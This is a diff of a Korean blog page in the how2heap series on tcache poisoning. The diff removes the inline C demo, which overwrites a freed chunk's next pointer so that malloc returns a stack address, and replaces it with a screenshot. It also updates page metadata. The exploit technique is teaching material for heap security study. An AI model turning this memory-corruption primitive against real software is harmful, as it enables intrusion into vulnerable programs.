@@ -20,18 +20,20 @@
     
         <meta name="keywords" content="Theory">
     
-    <meta name="description" content="Tcache_Poisoning 1234567891011121314151617181920212223242526272829303132333435#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;stdint.h&amp;gt;int main()&amp;#123;fprintf(stderr, &quot;이것은 malloc을 속여">
+    <meta name="description" content="Tcache_Poisoning   이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로 반환하는 간단한 tcache poisoning 공격이다. 이 공격은 fastbin corruption 공격과 매우 비슷하다. malloc()을 반환할 주소는 0x7fffb6be4b80이다. buffer를 한 개 할당한다. malloc(128):">
 <meta name="keywords" content="Theory">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[How2Heap] Tcache_Poisoning">
 <meta property="og:url" content="http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="Tcache_Poisoning 1234567891011121314151617181920212223242526272829303132333435#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;stdint.h&amp;gt;int main()&amp;#123;fprintf(stderr, &quot;이것은 malloc을 속여">
+<meta property="og:description" content="Tcache_Poisoning   이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로 반환하는 간단한 tcache poisoning 공격이다. 이 공격은 fastbin corruption 공격과 매우 비슷하다. malloc()을 반환할 주소는 0x7fffb6be4b80이다. buffer를 한 개 할당한다. malloc(128):">
 <meta property="og:locale" content="ko">
-<meta property="og:updated_time" content="2019-06-26T14:46:22.000Z">
+<meta property="og:image" content="https://user-images.githubusercontent.com/16969364/63587936-34299f80-c5e0-11e9-9efa-1b7fd296cedc.png">
+<meta property="og:updated_time" content="2019-08-23T10:59:49.466Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[How2Heap] Tcache_Poisoning">
-<meta name="twitter:description" content="Tcache_Poisoning 1234567891011121314151617181920212223242526272829303132333435#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;stdint.h&amp;gt;int main()&amp;#123;fprintf(stderr, &quot;이것은 malloc을 속여">
+<meta name="twitter:description" content="Tcache_Poisoning   이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로 반환하는 간단한 tcache poisoning 공격이다. 이 공격은 fastbin corruption 공격과 매우 비슷하다. malloc()을 반환할 주소는 0x7fffb6be4b80이다. buffer를 한 개 할당한다. malloc(128):">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/63587936-34299f80-c5e0-11e9-9efa-1b7fd296cedc.png">
     
 	<link rel="canonical" href="http://j0n9hyun.github.io/2019/06/26/how2heap-tcache-poisoning/">
 
@@ -180,13 +182,13 @@
         <a class="tag-link" href="/tags/Theory/">Theory</a>
     </div>
 
-  			<span class="reading-time">⏱ 3 분</span>
+  			<span class="reading-time">⏱ 1 분</span>
             </div>
         
         
         <div class="article-entry" itemprop="articleBody">
             <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="tcache_poisoning"><a class="markdownIt-Anchor" href="#tcache_poisoning"></a> Tcache_Poisoning</h3>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로\n"</span></span><br><span class="line"><span class="string">"반환하는 간단한 tcache poisoning 공격이다.\n"</span></span><br><span class="line"><span class="string">"이 공격은 fastbin corruption 공격과 매우 비슷하다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc()을 반환할 주소는 %p이다.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer를 한 개 할당한다.\n"</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer를 free한다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"tcache list : [ %p ]\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"조작할 위치(%p)를 가리키도록 %p에 있는 데이터의\n"</span></span><br><span class="line"><span class="string">"처음 %lu 바이트(fd/next pointer)를 overwrite한다.\n"</span>, &amp;stack_var, a, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>));</span><br><span class="line">a[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"tcache list : [ %p ]\n"</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(128): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"조작에 성공했다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://user-images.githubusercontent.com/16969364/63587936-34299f80-c5e0-11e9-9efa-1b7fd296cedc.png" alt="tcache_poisoning.c"></p>
 <center>
 <p>이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로<br>
 반환하는 간단한 <code>tcache poisoning</code> 공격이다.<br>
@@ -282,16 +284,23 @@ buffer를 free한다.<br>
             "name": "j0n9hyun"
         },
         "headline": "[How2Heap] Tcache_Poisoning",
-        "image": "http://j0n9hyun.github.io",
+        "image": "http://j0n9hyun.github.iohttps://user-images.githubusercontent.com/16969364/63587936-34299f80-c5e0-11e9-9efa-1b7fd296cedc.png",
         "keywords": "Theory",
         "genre": "Theory",
         "datePublished": "2019-06-26",
         "dateCreated": "2019-06-26",
-        "dateModified": "2019-06-26",
+        "dateModified": "2019-08-23",
         "url": "http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/",
         "description": " Tcache_Poisoning
-1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main()&#123;fprintf(stderr, "이것은 malloc을 속여"
-        "wordCount": 292
+
+
+이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로
+반환하는 간단한 tcache poisoning 공격이다.
+이 공격은 fastbin corruption 공격과 매우 비슷하다.
+malloc()을 반환할 주소는 0x7fffb6be4b80이다.
+buffer를 한 개 할당한다.
+malloc(128): "
+        "wordCount": 67
     }
 </script>
 
